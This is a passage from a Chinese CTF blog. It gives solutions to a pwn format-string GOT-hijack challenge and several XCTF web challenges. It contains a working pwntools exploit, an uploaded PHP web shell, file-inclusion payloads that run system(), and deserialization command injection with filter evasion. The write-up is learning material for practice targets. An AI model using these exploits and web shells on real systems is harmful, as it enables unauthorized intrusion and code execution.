/><p>思路：通过格式化字符串漏洞将函数strlen函数劫持为system函数(<strong>got表劫持</strong>)，将fini里面的函数劫持为start函数；输入”&#x2F;bin&#x2F;sh”获得flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#sh=process(&#x27;./greeting_150&#x27;)</span><br>sh =remote(<span class="hljs-string">&#x27;61.147.171.105&#x27;</span>,<span class="hljs-number">54469</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./greeting_150&#x27;</span>)<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>strlen_got=elf.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]                          <span class="hljs-comment">#0x8049A54，为要修改的函数的got表单地址，需要修i改为0x0804 8490</span><br>start_addr=<span class="hljs-number">0x080484F0</span>                                 <span class="hljs-comment">#起始地址</span><br>fini_addr=<span class="hljs-number">0x08049934</span>                                  <span class="hljs-comment">#fini_addr，需要修改为0x08048490</span><br>system_plt = <span class="hljs-number">0x08048490</span>                               <span class="hljs-comment">#system的plt地址</span><br><span class="hljs-comment">#格式化字符串修改任意内存地址</span><br>payload=<span class="hljs-string">b&quot;aa&quot;</span><br>payload+=p32(strlen_got+<span class="hljs-number">2</span>)<br>payload+=p32(strlen_got)    <br>payload+=p32(fini_addr)     <br>payload+=<span class="hljs-string">b&quot;%2020c%12$hn&quot;</span>                             <span class="hljs-comment">#0x804-18-(2+4+4+4)=2020,&#x27;Nice to meet you, &#x27;的长度为18</span><br>payload+=<span class="hljs-string">b&quot;%31884c%13$hn&quot;</span>                            <span class="hljs-comment">#0x8490-0x804=31884</span><br>payload+=<span class="hljs-string">b&quot;%96c%14$hn&quot;</span>                               <span class="hljs-comment">#0x84f0-0x8490=96</span><br>     <br>sh.recvuntil(<span class="hljs-string">&#x27;Please tell me your name... &#x27;</span>)<br>sh.sendline(<span class="hljs-string">b&#x27;aa&#x27;</span>+payload)<br>sh.recvuntil(<span class="hljs-string">&#x27;Please tell me your name... &#x27;</span>)<br>sh.sendline(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-web入门</title>
    <link href="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/"/>
    <url>/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="easyupload"><a href="#easyupload" class="headerlink" title="easyupload"></a>easyupload</h3><h4 id="后门上传以及绕过"><a href="#后门上传以及绕过" class="headerlink" title="后门上传以及绕过"></a>后门上传以及绕过</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">检查文件内容是否有php字符串<br>检查后缀中是否有htaccess或ph<br>检查文件头部信息<br>检查文件类型<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">利用短标签&lt;?=<br>利用.<span class="hljs-keyword">user</span>.ini文件构成的PHP后门<br>在文件头部添加一个图片的文件头，比如GIF89a<br>修改上传时的Content-<span class="hljs-keyword">Type</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230312210739643.png" alt="image-20230312210739643"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a                  <br><span class="hljs-attribute">auto_prepend_file</span>=a.jpg<br></code></pre></td></tr></table></figure><p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230312210903075.png" alt="image-20230312210903075"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230312211054336.png" alt="image-20230312211054336"></p><h3 id="fileinclude"><a href="#fileinclude" class="headerlink" title="fileinclude"></a>fileinclude</h3><h4 id="PHP文件包含利用"><a href="#PHP文件包含利用" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h4><p>网页源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;html&gt;<br>&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;/head&gt;<br><br>&lt;br /&gt;<br>&lt;b&gt;Notice&lt;/b&gt;:  Undefined index: language in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;9&lt;/b&gt;&lt;br /&gt;<br>Please choose the language you want : English or Chinese<br>&lt;h1&gt;Hi,EveryOne,The flag is in flag.php&lt;/h1&gt;&lt;html&gt;<br>&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;/head&gt;<br><br>&lt;?php<br>if( !ini_get(&#x27;display_errors&#x27;) ) &#123;<br>  ini_set(&#x27;display_errors&#x27;, &#x27;On&#x27;);<br>  &#125;<br>error_reporting(E_ALL);<br>$lan = $_COOKIE[&#x27;language&#x27;];    //取cookie language<br>if(!$lan)<br>&#123;<br>@setcookie(&quot;language&quot;,&quot;english&quot;);<br>@include(&quot;english.php&quot;);<br>&#125;<br>else<br>&#123;<br>@include($lan.&quot;.php&quot;);        //拼接.php<br>&#125;<br>$x=file_get_contents(&#x27;index.php&#x27;);<br>echo $x;<br>?&gt;<br>&lt;/html&gt;&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>构造Cookie：language&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag</p><p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230312214026007.png" alt="image-20230312214026007"></p><p>返回base64解码得到flag</p><h3 id="fileclude"><a href="#fileclude" class="headerlink" title="fileclude"></a>fileclude</h3><h4 id="PHP文件包含利用-1"><a href="#PHP文件包含利用-1" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h4><p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230312220030319.png" alt="image-20230312220030319"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">61.147</span>.<span class="hljs-number">171.105</span>:<span class="hljs-number">54651</span><span class="hljs-regexp">/?file1=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode<span class="hljs-regexp">/resource=flag.php&amp;file2=data:/</span><span class="hljs-regexp">/text/</span>plain,hello ctf<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">61.147</span>.<span class="hljs-number">171.105</span>:<span class="hljs-number">54651</span>/?file1=php:<span class="hljs-regexp">//</span>filter/<span class="hljs-keyword">read</span>=convert.base64-encode/resource=flag.php&amp;file2=php:<span class="hljs-regexp">//inpu</span>t<br>POST 传输的数据是：hello ctf<br></code></pre></td></tr></table></figure><h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><h4 id="PHP文件包含利用-2"><a href="#PHP文件包含利用-2" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h4><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://61.147.171.105:52879/?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">http://61.147.171.105:52879/?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir&quot;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">http://61.147.171.105:52879/?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat fl4gisisish3r3.php&quot;</span>)<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="file-include"><a href="#file-include" class="headerlink" title="file_include"></a>file_include</h3><h4 id="PHP文件包含利用-3"><a href="#PHP文件包含利用-3" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./check.php&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码很简单，构造</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">61.147</span>.<span class="hljs-number">171.105</span>:<span class="hljs-number">51485</span><span class="hljs-regexp">/?filename=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>失败显示<strong>do not hack!</strong></p><p>利用convert.* 过滤器，构造</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">61.147</span>.<span class="hljs-number">171.105</span>:<span class="hljs-number">51485</span><span class="hljs-regexp">/?filename=php:/</span><span class="hljs-regexp">/filter/</span>convert.iconv.UTF-<span class="hljs-number">7</span>.UCS-<span class="hljs-number">4</span>LE*/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="unseping"><a href="#unseping" class="headerlink" title="unseping"></a>unseping</h3><h4 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;method, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;ping&quot;</span>))) &#123;<br>            <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$this</span>-&gt;method), <span class="hljs-variable language_">$this</span>-&gt;args);<br>        &#125;<br>    &#125; <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$result</span>);<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$pat_array</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;don&#x27;t hack&quot;</span>;<br>        &#125;<br>    &#125;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$v</span>);<br>        &#125;<br>    &#125;   <br>&#125;<br><span class="hljs-variable">$ctf</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ctf</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>根据代码构造ease类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>    &#125; <br>&#125;<br><span class="hljs-variable">$ctf</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l&quot;&quot;s&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$ctf</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313090927169.png" alt="image-20230313090927169"></p><img src="image-20230313091104914.png" alt="image-20230313091104914" style="zoom:50%;" /><p>构造 ls flag_1s_here </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ctf</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l&quot;&quot;s$&#123;IFS&#125;fl&quot;&quot;ag_1s_here&#x27;</span>));<br></code></pre></td></tr></table></figure><img src="image-20230313091603555.png" alt="image-20230313091603555" style="zoom:50%;" /><p>构造cat flag_1s_here&#x2F;flag_831b69012c67b35f.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ctf</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;c&quot;&quot;at$&#123;IFS&#125;f&quot;&quot;lag_1s_here$(printf$&#123;IFS&#125;&quot;\57&quot;)f&quot;&quot;lag_831b69012c67b35f.p&quot;&quot;hp&#x27;</span>));<br></code></pre></td></tr></table></figure><img src="image-20230313091747429.png" alt="image-20230313091747429" style="zoom:50%;" /><h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><h4 id="php反序列化-1"><a href="#php反序列化-1" class="headerlink" title="php反序列化"></a>php反序列化</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;                         <span class="hljs-comment">//file不等于index.php设置为index.php，需绕过</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]); <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123;            <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>);    <span class="hljs-comment">//匹配以字母o或字母c开头，后跟一个冒号，再后跟一个或多个数字，最后再跟一个冒号的子串</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;fl4g.php&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>, <span class="hljs-string">&#x27;O:+4&#x27;</span>,<span class="hljs-variable">$a</span>);     <span class="hljs-comment">//绕过preg_match()函数</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:1:&#x27;</span>, <span class="hljs-string">&#x27;:2:&#x27;</span>,<span class="hljs-variable">$a</span>); <span class="hljs-comment">//绕过__wakeup()函数</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><h4 id="代码审计及解密"><a href="#代码审计及解密" class="headerlink" title="代码审计及解密"></a>代码审计及解密</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$miwen</span>=<span class="hljs-string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$_o</span>=<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$str</span>);              <span class="hljs-comment">//反转字符串</span><br>    <span class="hljs-comment">// echo $_o;     </span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$_0</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$_0</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_o</span>);<span class="hljs-variable">$_0</span>++)&#123;  <br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_o</span>,<span class="hljs-variable">$_0</span>,<span class="hljs-number">1</span>);     <span class="hljs-comment">//遍历字符串字符</span><br>        <span class="hljs-variable">$__</span>=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$_c</span>)+<span class="hljs-number">1</span>;            <span class="hljs-comment">//字符ASCII值+1</span><br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$__</span>);              <span class="hljs-comment">//ASCII值返回字符</span><br>        <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_c</span>;                  <span class="hljs-comment">//连接组成新字符串</span><br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_</span>)));       <br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   逆向加密算法，解密$miwen就是flag</span><br><span class="hljs-comment">*/</span><br>?<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span 